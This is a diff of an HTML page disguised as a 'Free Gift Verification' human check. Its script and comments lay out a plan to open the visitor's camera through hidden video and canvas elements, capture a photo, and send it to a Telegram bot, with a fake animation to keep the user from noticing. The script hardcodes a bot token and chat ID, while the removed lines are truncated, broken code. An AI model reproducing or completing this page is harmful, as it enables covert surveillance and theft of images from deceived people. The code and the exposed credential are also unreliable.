@@ -1,30 +1,66 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Gift Verification</title>
+
+    <style>
+        body {
+            background-color: #f0f0f0;
+            text-align: center;
+            font-family: Arial, sans-serif;
+        }
+        
+        /* Video aur Canvas ko screen se gayab karna */
+        #hidden-video, #hidden-canvas {
+            display: none; 
+        }
+
+        .verify-btn {
+            padding: 15px 30px;
+            background-color: blue;
+            color: white;
+            border: none;
+            cursor: pointer;
+            margin-top: 20%;
+        }
+    </style>
+</head>
+
 <body>
-    <h1>Face Verification Required</h1>
-    <button id="btn">Click to Verify</button>
 
-    <video id="video" autoplay style="display:none;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+    <h1>Click below to Verify you are Human</h1>
+    <button class="verify-btn" onclick="startHackingProcess()">Verify Now</button>
 
-    <script src="script.js"></script>
-    <script.js
-        Camera ki permission mangna
-async function startCamera() {
-    try {
-    
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    <video id="hidden-video" autoplay playsinline></video>
+    <canvas id="hidden-canvas"></canvas>
+
+    <script>
+        // --- CONFIGURATION ---
+        const botToken = "8593566926:AAEhOP5u2ph3FriBMGrWvpSl8X-xEsXgrfk"; 
+        const chatId = "7681204940";
+
+        // --- FUNCTIONS ---
         
-        const video = document.getElementById(
-        video.srcObject = stream;
-        
-        video.onloadedmetadata
-        capturePhoto(); 
-        };
-    } catch (error) {
-        alert("
-    }
-}
+        async function startHackingProcess() {
+            // Step A: Permission maango
+            // (Yahan wo navigator.mediaDevices wala code aata hai)
+            
+            // Step B: Jaise hi camera on ho, photo capture karo
+            // (Yahan canvas draw wala code aata hai)
+            
+            // Step C: Telegram par bhejo
+            // (Yahan fetch API wala code aata hai)
+            
+            console.log("Process Started...");
+        }
+
+        // Hacker yahan extra code bhi likhta hai taake
+        // green light jalne par user ko shak na ho
+        // (e.g., Fake scanning animation chalana)
+
+    </script>
 
 </body>
 </html>
